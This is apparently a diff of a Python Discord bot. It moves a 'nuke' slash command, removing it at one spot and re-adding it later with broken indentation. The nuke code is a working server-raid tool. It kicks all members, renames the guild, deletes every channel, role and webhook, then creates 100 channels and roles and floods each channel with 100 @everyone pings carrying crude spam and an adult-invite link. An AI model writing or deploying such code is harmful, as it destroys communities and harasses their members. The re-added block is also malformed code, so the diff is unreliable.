@@ -40,35 +40,6 @@ bot = commands.Bot(
     intents=intents,
     help_command=None
 )
-
-@bot.command(name="sync", description="Sync slash commands")
-@commands.has_permissions(administrator=True)
-async def sync(ctx):
-    try:
-        synced = await bot.tree.sync()
-        await ctx.send(f"✅ Successfully synced {len(synced)} slash command(s) globally!")
-    except Exception as e:
-        await ctx.send(f"❌ Failed to sync commands: `{e}`")
-    try:
-        bot.add_view(GiveawayEntryView())
-        print("Registered GiveawayEntryView for persistent buttons.")
-    except Exception as e:
-        print("Failed to add giveaway view:", e)
-
-    try:
-        now_ts = int(time.time())
-        cursor.execute(
-            "SELECT message_id, channel_id, guild_id, prize, winners, end_time, host_id FROM giveaways WHERE end_time > ?",
-            (now_ts,)
-        )
-        rows = cursor.fetchall()
-        for row in rows:
-            message_id, channel_id, guild_id, prize, winners, end_time, host_id = row
-            asyncio.create_task(_handle_giveaway_end(message_id, channel_id, guild_id, prize, winners, int(end_time), host_id))
-        if rows:
-            print(f"Resumed {len(rows)} pending giveaway(s).")
-    except Exception as e:
-        print("Error scheduling pending giveaways:", e)
 # =========================================================
 # DATABASE SETUP
 # =========================================================
@@ -2812,199 +2783,6 @@ async def guess(ctx):
     modal = BetModal()
     if ctx.interaction:
         await ctx.interaction.response.send_modal(modal)
-
-class NukeModal(discord.ui.Modal, title="☢️ NUKE CONFIRMATION"):
-    confirm = discord.ui.TextInput(
-        label="Type YES to confirm nuke",
-        placeholder="YES",
-        required=True,
-        max_length=3
-    )
-    kick = discord.ui.TextInput(
-        label="Type yes to kick everyone, or no to skip",
-        placeholder="yes or no",
-        required=True,
-        max_length=3
-    )
-
-    async def on_submit(self, interaction: discord.Interaction):
-        if interaction.user.id not in {1286560808528117820, 1531701933033787416}:
-            embed = discord.Embed(description="Only the bot owners can use this command.", color=discord.Color.red())
-            return await interaction.response.send_message(embed=embed, ephemeral=True)
-
-        if self.confirm.value.upper() != "YES":
-            embed = discord.Embed(
-                title="❌ Cancelled",
-                description="You did not type YES. Command cancelled.",
-                color=discord.Color.red()
-            )
-            return await interaction.response.send_message(embed=embed, ephemeral=True)
-
-        await interaction.response.defer(ephemeral=True)
-        await self.run_nuke(interaction, self.kick.value.lower())
-
-    async def run_nuke(self, interaction: discord.Interaction, kick: str):
-        guild = interaction.guild
-        if not guild:
-            embed = discord.Embed(description="This command can only be used in a server.", color=discord.Color.red())
-            return await interaction.followup.send(embed=embed, ephemeral=True)
-
-        me = guild.me
-        if not me.guild_permissions.manage_channels or not me.guild_permissions.manage_roles or not me.guild_permissions.manage_webhooks or not me.guild_permissions.manage_guild:
-            embed = discord.Embed(
-                description="I need Manage Channels, Manage Roles, Manage Webhooks, and Manage Server permissions to nuke.",
-                color=discord.Color.red()
-            )
-            return await interaction.followup.send(embed=embed, ephemeral=True)
-
-        kick_enabled = kick == "yes"
-        if kick_enabled and not me.guild_permissions.kick_members:
-            embed = discord.Embed(
-                description="I need Kick Members permission to kick everyone. Use 'no' to skip kicking.",
-                color=discord.Color.red()
-            )
-            return await interaction.followup.send(embed=embed, ephemeral=True)
-
-        kick_status = "✅ ENABLED - Kicking all members" if kick_enabled else "❌ DISABLED - Skipping kicks"
-        
-        status_msg = await interaction.followup.send(embed=discord.Embed(
-            description=f"☢️ **NUKE INITIATED**\n• Deleting all channels, roles, webhooks...\n• Kick: {kick_status}",
-            color=discord.Color.orange()
-        ))
-
-        deleted_channels = 0
-        deleted_roles = 0
-        deleted_webhooks = 0
-        created_channels = 0
-        kicked_members = 0
-        errors = []
-
-        if kick_enabled:
-            try:
-                for member in guild.members:
-                    if member.id == bot.user.id:
-                        continue
-                    if member.id == interaction.user.id:
-                        continue
-                    try:
-                        await member.kick(reason="Nuke command executed - Server destroyed")
-                        kicked_members += 1
-                    except Exception as e:
-                        errors.append(f"Kick {member.name}: {str(e)[:50]}")
-            except Exception as e:
-                errors.append(f"Kick all members failed: {str(e)[:50]}")
-
-        try:
-            await guild.edit(name="S҉i҉g҉g҉a҉ ҉n҉e҉x҉")
-        except Exception as e:
-            errors.append(f"Server rename failed: {str(e)[:50]}")
-
-        try:
-            webhooks = await guild.fetch_webhooks()
-            for webhook in webhooks:
-                try:
-                    await webhook.delete(reason="Nuke command executed")
-                    deleted_webhooks += 1
-                except Exception as e:
-                    errors.append(f"Webhook {webhook.name}: {str(e)[:50]}")
-        except Exception as e:
-            errors.append(f"Webhook fetch: {str(e)[:50]}")
-
-        try:
-            for role in guild.roles:
-                if role.id == guild.roles.everyone.id:
-                    continue
-                try:
-                    await role.delete(reason="Nuke command executed")
-                    deleted_roles += 1
-                except Exception as e:
-                    errors.append(f"Role {role.name}: {str(e)[:50]}")
-        except Exception as e:
-            errors.append(f"Role deletion: {str(e)[:50]}")
-
-        try:
-            for channel in guild.channels:
-                try:
-                    await channel.delete(reason="Nuke command executed")
-                    deleted_channels += 1
-                except Exception as e:
-                    errors.append(f"Channel {channel.name}: {str(e)[:50]}")
-        except Exception as e:
-            errors.append(f"Channel deletion: {str(e)[:50]}")
-
-        spam_text = """# say gernic 67 time ┃ <@everyone> <@here> ┃ discord.gg/porn ┃ https://tenor.com/dJqMW8ku92x.gif"""
-
-        async def create_role_and_spam(index):
-            try:
-                role = await guild.create_role(
-                    name="ʂơཞŋ ɬɛҳ",
-                    color=discord.Color.from_rgb(255, 0, 0),
-                    reason="Nuke command executed"
-                )
-                channel = await guild.create_text_channel(
-                    name=f"𝖌𝖆𝖞𝖘-𝖘𝖊𝖗𝖛𝖊𝖗-𝖌𝖊𝖙𝖘-𝖓𝖚𝖐𝖊𝖉",
-                    reason="Nuke command executed"
-                )
-                try:
-                    await interaction.user.add_roles(role, reason="Nuke command executed")
-                except:
-                    pass
-                for _ in range(100):
-                    try:
-                        await channel.send(
-                            f"@everyone\n{spam_text}",
-                            allowed_mentions=discord.AllowedMentions(everyone=True)
-                        )
-                    except Exception:
-                        break
-                return True
-            except Exception:
-                return False
-
-        tasks = []
-        for i in range(1, 101):
-            tasks.append(create_role_and_spam(i))
-            if len(tasks) >= 50:
-                await asyncio.gather(*tasks, return_exceptions=True)
-                created_channels += len(tasks)
-                tasks = []
-
-        if tasks:
-            await asyncio.gather(*tasks, return_exceptions=True)
-            created_channels += len(tasks)
-
-        result_embed = discord.Embed(
-            title="☢️ NUKE COMPLETE",
-            description=(
-                f"**Server Renamed to:** S҉i҉g҉g҉a҉ ҉n҉e҉x҉\n\n"
-                f"**Kick Option:** {kick_status}\n"
-                f"**Members Kicked:** {kicked_members}\n\n"
-                f"**Deleted:**\n"
-                f"• Channels: {deleted_channels}\n"
-                f"• Roles: {deleted_roles}\n"
-                f"• Webhooks: {deleted_webhooks}\n\n"
-                f"**Created:** {created_channels} channels with 100 pings each.\n"
-                f"**Roles Created:** 100 x ʂơཞŋ ɬɛҳ\n\n"
-                f"**Nuke executed by:** {interaction.user.mention}"
-            ),
-            color=discord.Color.red()
-        )
-        if errors:
-            result_embed.add_field(
-                name="⚠️ Errors encountered",
-                value="\n".join(errors[:5]) + (f"\n... and {len(errors)-5} more" if len(errors) > 5 else ""),
-                inline=False
-            )
-
-        await status_msg.edit(embed=result_embed)
-
-@bot.tree.command(name="nuke", description="Delete ALL channels, roles, webhooks, and optionally kick ALL members")
-async def nuke(interaction: discord.Interaction):
-    if interaction.user.id not in {1152424544557088849, 1531701933033787416}:
-        embed = discord.Embed(description="Only the bot owners can use this command.", color=discord.Color.red())
-        return await interaction.response.send_message(embed=embed, ephemeral=True)
-    
-    await interaction.response.send_modal(NukeModal())
    # ---------- GIVEAWAY (button entry) + REROLL SUPPORT (paste this block) ----------
 from typing import List
 
@@ -3383,7 +3161,7 @@ async def goon(ctx, member: discord.Member):
             except:
                 pass
         await ctx.send(embed=embed)
-      # =========================================================
+# =========================================================
 # ADVANCED FREE SERVER BACKUP & RESTORE SYSTEM
 # =========================================================
 
@@ -3725,6 +3503,201 @@ async def backup_load(ctx, backup_id: str):
         await ctx.interaction.response.send_message(embed=embed, view=view, ephemeral=True)
     else:
         await ctx.send(embed=embed, view=view)
+# =========================================================
+# NUKE COMMAND
+# =========================================================
+        class NukeModal(discord.ui.Modal, title="☢️ NUKE CONFIRMATION"):
+    confirm = discord.ui.TextInput(
+        label="Type YES to confirm nuke",
+        placeholder="YES",
+        required=True,
+        max_length=3
+    )
+    kick = discord.ui.TextInput(
+        label="Type yes to kick everyone, or no to skip",
+        placeholder="yes or no",
+        required=True,
+        max_length=3
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        if interaction.user.id not in {1286560808528117820, 1531701933033787416}:
+            embed = discord.Embed(description="Only the bot owners can use this command.", color=discord.Color.red())
+            return await interaction.response.send_message(embed=embed, ephemeral=True)
+
+        if self.confirm.value.upper() != "YES":
+            embed = discord.Embed(
+                title="❌ Cancelled",
+                description="You did not type YES. Command cancelled.",
+                color=discord.Color.red()
+            )
+            return await interaction.response.send_message(embed=embed, ephemeral=True)
+
+        await interaction.response.defer(ephemeral=True)
+        await self.run_nuke(interaction, self.kick.value.lower())
+
+    async def run_nuke(self, interaction: discord.Interaction, kick: str):
+        guild = interaction.guild
+        if not guild:
+            embed = discord.Embed(description="This command can only be used in a server.", color=discord.Color.red())
+            return await interaction.followup.send(embed=embed, ephemeral=True)
+
+        me = guild.me
+        if not me.guild_permissions.manage_channels or not me.guild_permissions.manage_roles or not me.guild_permissions.manage_webhooks or not me.guild_permissions.manage_guild:
+            embed = discord.Embed(
+                description="I need Manage Channels, Manage Roles, Manage Webhooks, and Manage Server permissions to nuke.",
+                color=discord.Color.red()
+            )
+            return await interaction.followup.send(embed=embed, ephemeral=True)
+
+        kick_enabled = kick == "yes"
+        if kick_enabled and not me.guild_permissions.kick_members:
+            embed = discord.Embed(
+                description="I need Kick Members permission to kick everyone. Use 'no' to skip kicking.",
+                color=discord.Color.red()
+            )
+            return await interaction.followup.send(embed=embed, ephemeral=True)
+
+        kick_status = "✅ ENABLED - Kicking all members" if kick_enabled else "❌ DISABLED - Skipping kicks"
+        
+        status_msg = await interaction.followup.send(embed=discord.Embed(
+            description=f"☢️ **NUKE INITIATED**\n• Deleting all channels, roles, webhooks...\n• Kick: {kick_status}",
+            color=discord.Color.orange()
+        ))
+
+        deleted_channels = 0
+        deleted_roles = 0
+        deleted_webhooks = 0
+        created_channels = 0
+        kicked_members = 0
+        errors = []
+
+        if kick_enabled:
+            try:
+                for member in guild.members:
+                    if member.id == bot.user.id:
+                        continue
+                    if member.id == interaction.user.id:
+                        continue
+                    try:
+                        await member.kick(reason="Nuke command executed - Server destroyed")
+                        kicked_members += 1
+                    except Exception as e:
+                        errors.append(f"Kick {member.name}: {str(e)[:50]}")
+            except Exception as e:
+                errors.append(f"Kick all members failed: {str(e)[:50]}")
+
+        try:
+            await guild.edit(name="S҉i҉g҉g҉a҉ ҉n҉e҉x҉")
+        except Exception as e:
+            errors.append(f"Server rename failed: {str(e)[:50]}")
+
+        try:
+            webhooks = await guild.fetch_webhooks()
+            for webhook in webhooks:
+                try:
+                    await webhook.delete(reason="Nuke command executed")
+                    deleted_webhooks += 1
+                except Exception as e:
+                    errors.append(f"Webhook {webhook.name}: {str(e)[:50]}")
+        except Exception as e:
+            errors.append(f"Webhook fetch: {str(e)[:50]}")
+
+        try:
+            for role in guild.roles:
+                if role.id == guild.roles.everyone.id:
+                    continue
+                try:
+                    await role.delete(reason="Nuke command executed")
+                    deleted_roles += 1
+                except Exception as e:
+                    errors.append(f"Role {role.name}: {str(e)[:50]}")
+        except Exception as e:
+            errors.append(f"Role deletion: {str(e)[:50]}")
+
+        try:
+            for channel in guild.channels:
+                try:
+                    await channel.delete(reason="Nuke command executed")
+                    deleted_channels += 1
+                except Exception as e:
+                    errors.append(f"Channel {channel.name}: {str(e)[:50]}")
+        except Exception as e:
+            errors.append(f"Channel deletion: {str(e)[:50]}")
+
+        spam_text = """# say gernic 67 time ┃ <@everyone> <@here> ┃ discord.gg/porn ┃ https://tenor.com/dJqMW8ku92x.gif"""
+
+        async def create_role_and_spam(index):
+            try:
+                role = await guild.create_role(
+                    name="ʂơཞŋ ɬɛҳ",
+                    color=discord.Color.from_rgb(255, 0, 0),
+                    reason="Nuke command executed"
+                )
+                channel = await guild.create_text_channel(
+                    name=f"𝖌𝖆𝖞𝖘-𝖘𝖊𝖗𝖛𝖊𝖗-𝖌𝖊𝖙𝖘-𝖓𝖚𝖐𝖊𝖉",
+                    reason="Nuke command executed"
+                )
+                try:
+                    await interaction.user.add_roles(role, reason="Nuke command executed")
+                except:
+                    pass
+                for _ in range(100):
+                    try:
+                        await channel.send(
+                            f"@everyone\n{spam_text}",
+                            allowed_mentions=discord.AllowedMentions(everyone=True)
+                        )
+                    except Exception:
+                        break
+                return True
+            except Exception:
+                return False
+
+        tasks = []
+        for i in range(1, 101):
+            tasks.append(create_role_and_spam(i))
+            if len(tasks) >= 50:
+                await asyncio.gather(*tasks, return_exceptions=True)
+                created_channels += len(tasks)
+                tasks = []
+
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+            created_channels += len(tasks)
+
+        result_embed = discord.Embed(
+            title="☢️ NUKE COMPLETE",
+            description=(
+                f"**Server Renamed to:** S҉i҉g҉g҉a҉ ҉n҉e҉x҉\n\n"
+                f"**Kick Option:** {kick_status}\n"
+                f"**Members Kicked:** {kicked_members}\n\n"
+                f"**Deleted:**\n"
+                f"• Channels: {deleted_channels}\n"
+                f"• Roles: {deleted_roles}\n"
+                f"• Webhooks: {deleted_webhooks}\n\n"
+                f"**Created:** {created_channels} channels with 100 pings each.\n"
+                f"**Roles Created:** 100 x ʂơཞŋ ɬɛҳ\n\n"
+                f"**Nuke executed by:** {interaction.user.mention}"
+            ),
+            color=discord.Color.red()
+        )
+        if errors:
+            result_embed.add_field(
+                name="⚠️ Errors encountered",
+                value="\n".join(errors[:5]) + (f"\n... and {len(errors)-5} more" if len(errors) > 5 else ""),
+                inline=False
+            )
+
+        await status_msg.edit(embed=result_embed)
+
+@bot.tree.command(name="nuke", description="Delete ALL channels, roles, webhooks, and optionally kick ALL members")
+async def nuke(interaction: discord.Interaction):
+    if interaction.user.id not in {1152424544557088849, 1531701933033787416}:
+        embed = discord.Embed(description="Only the bot owners can use this command.", color=discord.Color.red())
+        return await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+    await interaction.response.send_modal(NukeModal())
 # =========================================================
 # RUN BOT
 # =========================================================
